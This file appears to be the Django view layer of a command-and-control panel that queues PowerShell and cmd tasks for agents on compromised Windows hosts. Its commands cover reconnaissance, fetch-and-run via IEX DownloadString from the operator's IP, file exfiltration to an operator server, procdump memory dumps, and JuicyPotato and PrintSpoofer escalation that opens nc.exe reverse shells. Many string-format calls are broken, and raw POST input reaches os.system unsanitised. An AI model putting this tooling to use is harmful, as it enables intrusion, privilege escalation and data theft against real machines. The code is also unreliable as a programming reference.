import os
from blog.views import *
from blog.models import *
from django.http import HttpResponse , JsonResponse
from blog import forms
import netifaces

# from rest_framework.views import APIView

current_path= os.path.dirname(os.path.abspath(__file__))
tools_path = os.path.normpath(current_path+os.sep+os.pardir)+"/Tools&Scripts"

#we need to send request from GUI user with agent(hidden parm) and path(opt)
def DirectoryListing(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        path = request.POST['path']
        task = 'echo "++++++++++++++++++`r`n`t`r`n`t";ls {};echo "++++++++++++++++++`r`n`t`r`n"'.format(path)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')
    # ls c:\users

def Applocker(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        task = 'echo "++++++++++++++++++`r`n`t`r`n===============AppLocker_Rules===============";Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections;echo "===============AppLocker_Policy_Test===============";Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone;echo "++++++++++++++++++`r`n`t`r`n"'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')
    
    

def Download_IWR(request):
    if request.method=='POST':
        agent = request.POST['agent']
        url = request.POST['url']
        outpath = request.POST['outpath']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        task = '[Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls";iwr -UseBasicParsing {} -OutFile {}'.format(url, outpath)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')

def DownloadFileAsync(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        url = request.POST['url']
        outpath = request.POST['outpath']
        task = "(New-Object Net.WebClient).DownloadFileAsync('{}', '{}')".format(url, outpath)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')

def DownloadString(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        url = request.POST['url']
        task = "IEX (New-Object Net.WebClient).DownloadString('{url}')".format(url)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')


def Download_SMB(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        url = request.POST['url']
        task = "copy \\{ip}:{port}\share\{fileName}".format(url)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')

def Download_FTP(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        ip = request.POST['ip']
        filename = request.POST['filename']
        outpath = request.POST['outpath']
        task = "(New-Object Net.WebClient).DownloadFile('ftp://{ip}/{filename}', '{outpath}')".format(ip,filename, outpath)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')


def Invoke_fileUpload(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        serverport = request.POST['serverport']
        ip = request.POST['ip']
        filepath = request.POST['filepath']
        task = "Invoke-FileUpload -Uri http://{ip}:{serverport}/upload -File {filepath}".format(ip,serverport,filepath)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')


def FTP_fileUpload(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        serverport = request.POST['serverport']
        ip = request.POST['ip']
        filepath = request.POST['filepath']
        outfile = request.POST['outfile']
        task = "(New-Object Net.WebClient).UploadFile('ftp://{ip}:{serverport}/{outfile}', '{filepath}')".format(ip,serverport,outfile,filepath)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')

def open_pythonserver(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        timeout = request.POST['timeout']
        serverport = request.POST['serverport']
        directory = request.POST['directory']
        result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
        result_path = result_dir+"results"
        os.system("echo '\n\n===============Python Server===============\nFor {timeout} seconds' >> {result_path}; timeout {timeout} python3 -m http.server --directory {directory} {serverport};".format(timeout,result_path,directory,serverport))
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')

def open_SMBserver(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        timeout = request.POST['timeout']
        serverport = request.POST['serverport']
        directory = request.POST['directory']
        result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
        result_path = result_dir+"results"
        os.system("echo '\n\n===============SMB Server===============\nFor {timeout} seconds' >> {result_path}; timeout {timeout} impacket-smbserver share -smb2support {directory} -port {port};".format(timeout,result_path,directory,serverport))
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')

def open_FTPserver(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        timeout = request.POST['timeout']
        serverport = request.POST['serverport']
        directory = request.POST['directory']
        result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
        result_path = result_dir+"results"
        os.system("echo '\n\n===============FTP Server===============\nFor {timeout} seconds' >> {result_path}; timeout {timeout}  python3 -m pyftpdlib --port {serverport} --directory {directory};".format(timeout,result_path,directory,serverport))
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')    


def open_PY_UploadServer(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        timeout = request.POST['timeout']
        serverport = request.POST['serverport']
        directory = request.POST['directory']
        result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
        result_path = result_dir+"results"
        os.system("echo '\n\n===============Python Upload Server===============\nFor {timeout} seconds' >> {result_path}; timeout {timeout}  python3 -m uploadserver --port {serverport} --directory {directory};".format(timeout,result_path,directory,serverport))
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')


def open_FTP_UploadServer(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        timeout = request.POST['timeout']
        serverport = request.POST['serverport']
        directory = request.POST['directory']
        result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
        result_path = result_dir+"results"
        os.system("echo '\n\n===============FTP Upload Server===============\nFor {timeout} seconds' >> {result_path}; timeout {timeout}  python3 -m pyftpdlib --port {serverport} --directory {directory} --write;".format(timeout,result_path,directory,serverport))
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')




def env_var(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        task = 'echo "++++++++++++++++++`r`n`t`r`n===============All_environment_variables===============";Get-ChildItem Env:;echo "++++++++++++++++++`r`n`t`r`n"'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')


def Phrase_finder(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        phrase = request.POST['phrase']
        task = 'echo "++++++++++++++++++`r`n`t`r`n===============All_files_contain_"{}"===============";findstr /SIM /C:"{}" *.txt *ini *.cfg *.config *.xml;echo "++++++++++++++++++`r`n`t`r`n"'.format(phrase , phrase)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')
    # ls c:\users



def IPsWindows(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        task = 'echo "++++++++++++++++++`r`n`t`r`n===============Interface_IP_and_DNS_information===============";ipconfig /all; echo "===============arp_table_information===============";arp -a;echo "++++++++++++++++++`r`n`t`r`n"'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')



def logged_users(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        task = 'echo "++++++++++++++++++`r`n`t`r`n===============LoggedIn_users===============";query user;echo "++++++++++++++++++`r`n`t`r`n"'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')


def Net_Connections(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        task = 'echo "++++++++++++++++++`r`n`t`r`n===============Network_connections===============";netstat -ano;echo "++++++++++++++++++`r`n`t`r`n"'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')


def Programs(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        task = 'echo "++++++++++++++++++`r`n`t`r`n===============Installed_programs===============";Get-WmiObject -Class Win32_Product |  select Name, Version;echo "++++++++++++++++++`r`n`t`r`n"'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')
    

#######   
def processes(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        task = 'echo "++++++++++++++++++`r`n`t`r`n===============Running_processes===============";tasklist ;echo "++++++++++++++++++`r`n`t`r`n"'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')


def ScreenShot(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        f = open("{}".format(current_path+"screenshot"), "rt")
        task = f.read()
        f.close()
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')


def winuser_info(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        task = 'echo "++++++++++++++++++`r`n`t`r`n===============Current_user===============";whoami;echo "===============User_Privileges==============="; whoami /priv;echo "===============User_group_information===============";whoami /groups;echo "++++++++++++++++++`r`n`t`r`n"'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')


def Systeminfo(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        task = 'echo "++++++++++++++++++`r`n`t`r`n===============System_Info===============";systeminfo;echo "===============Get_Password_Policy_and_Other_Account_Information===============";net accounts;echo "===============All_system_users===============";net user;echo "===============All_system_groups===============";net localgroup;echo "++++++++++++++++++`r`n`t`r`n"'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')
    
    
    


def UpdatesWindows(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        task = 'echo "++++++++++++++++++`r`n`t`r`n===============Patches_and_Updates===============";wmic qfe;Get-HotFix | ft -AutoSize;echo "++++++++++++++++++`r`n`t`r`n"'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')
    

def UploadFileWindows(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        ip = request.POST['ip']
        file_path = request.POST['file_path']
        destination = request.POST['destination']
        task = 'certutil.exe -urlcache -split -f http://{}:8000/{} {}'.format(ip,file_path,destination)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')
    
    
    
def WinDefStat(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        task = 'echo "++++++++++++++++++`r`n`t`r`n===============Windows_Defender_Status===============";Get-MpComputerStatus;echo "++++++++++++++++++`r`n`t`r`n"'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')



def Named_pipes(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        task = 'echo "++++++++++++++++++`r`n`t`r`n===============List_named_pipes===============";(get-childitem \\\.\pipe\).FullName;echo "++++++++++++++++++`r`n`t`r`n"'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')

def Perm_pip(request , agent='',named_pip_name=''):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        task = 'echo "++++++++++++++++++`r`n`t`r`n===============Review permissions on a named pipe===============";cmd;accesschk.exe /accepteula \\.\Pipe\{} -v;echo "++++++++++++++++++`r`n`t`r`n"'.format(named_pip_name)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')
       

def juicypotato (request):
    if request.method=='POST':
        myip = request.POST['myip']
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        listenport = request.POST['listenport']    
        pathOfJuicyOnVictim = request.POST['pathOfJuicyOnVictim']
        task = '{} -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe {} {} -e cmd.exe" -t *'.format(pathOfJuicyOnVictim,myip,listenport)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')
    


def printspoofer (request):
    if request.method=='POST':
        myip = request.POST['myip']
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        listenport = request.POST['listenport']    
        pathOfSpooferOnVictim = request.POST['pathOfSpooferOnVictim']
        task = '{} -c "c:\tools\nc.exe {} {} -e cmd"'.format(pathOfSpooferOnVictim,myip,listenport)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')


def procdump (request):
    if request.method=='POST':
        Args = request.POST['Args']
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        exeFile = request.POST['exeFile']    
        dmpFile = request.POST['dmpFile']
        task = 'procdump.exe {} {} {}'.format(Args,exeFile,dmpFile)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')



def tasklist (request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        
        task = 'echo "++++++++++++++++++`r`n`t`r`n===============Task_List===============";tasklist;echo "++++++++++++++++++`r`n`t`r`n"'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')


def Exec_With_Prnt_Priv(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save() 
        system_pid = request.POST['system_pid']    
        path_to_execute = request.POST['path_to_execute']
        listenerdata = ListenerForm.objects.filter("-created_date").values()[0]
        ip = listenerdata['ip']
        os.system("timeout 30 python3 -m http.server --directory {} 8888".format(tools_path))
        task = "IEX (New-Object Net.WebClient).DownloadString('http://{}:8888/psgetsys.ps1');[MyProcess]::CreateProcessFromParent({},'{}','')".format(ip,system_pid,path_to_execute)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')


        

def Import_Module (request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        Module_Path = request.POST['module_Path']
        task = "Import-Module .\{}".format(Module_Path)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')




def Exec_Module (request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()

        Module_Path = request.POST['Module_Path']
        task = ".\{}".format(Module_Path)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')

def Chk_File_Owner (request):

    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()

        FilePath = request.POST['FilePath']
        task = "cmd /c dir /q '{}'".format(FilePath)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')


def Take_Own (request):

    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()

        FilePath = request.POST['FilePath']
        task = "takeown /f '{}'".format(FilePath)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')


def ACL_modify (request):

    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()

        FilePath = request.POST['FilePath']
        UserName = request.POST['UserName']
        task = "icacls '{}' /grant {}:F".format(FilePath,UserName)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')


def SeBackUpPrivelege (request):

    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        # utilDLL_PATH = request.POST['utilDLL_PATH']
        # CmdLets_PATH = request.POST['CmdLets_PATH']        
        FileToCopy = request.POST['FileToCopy']
        outPut = request.POST['outPut']
        os.system("timeout 30 python3 -m http.server --directory {} 8888".format(tools_path))
        #dll download
        task = "IEX (New-Object Net.WebClient).DownloadString('http://{}:8888/SeBackupPrivilegeCmdLets.dll');IEX (New-Object Net.WebClient).DownloadString('http://{}:8888/SeBackupPrivilegeUtils.dll');Set-SeBackupPrivilege;Copy-FileSeBackupPrivilege '{}' .\{}".format(FileToCopy,outPut)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')


#dll, ps1, exe